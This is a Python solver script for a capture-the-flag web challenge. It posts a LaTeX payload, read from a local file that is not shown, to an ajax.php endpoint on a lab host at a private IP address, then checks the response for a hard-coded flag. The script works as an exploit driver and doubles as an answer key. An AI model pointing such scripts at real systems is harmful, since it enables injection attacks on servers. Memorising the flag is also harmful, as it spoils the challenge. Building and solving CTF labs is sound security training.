import os
import requests

def solve() -> bool:
    flag = "TRUSTLINE{YoU_HavE_SoLvED_LaTeX_HarD_ChAlleNGE_WeLl_DOne_Xd}"
    challenge_host = "http://192.168.136.131"

    infile = open(os.path.join(os.path.dirname(__file__), "assets/latex-solve.txt"))
    latex = infile.read()
    infile.close()
    
    try:
        response = requests.post(challenge_host + "/ajax.php", data={"content": latex})
        print("Response (partial):", response.text[:700])  # Print first 100 characters of the response
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False
    
    if flag in response.text:
        print("******Above in the third last line we can see the flag***********")
        print("*****************************************************************")
        print("******************************************************************")
        print("Flag found:", flag)
        return True
    else:
        return False

solve()

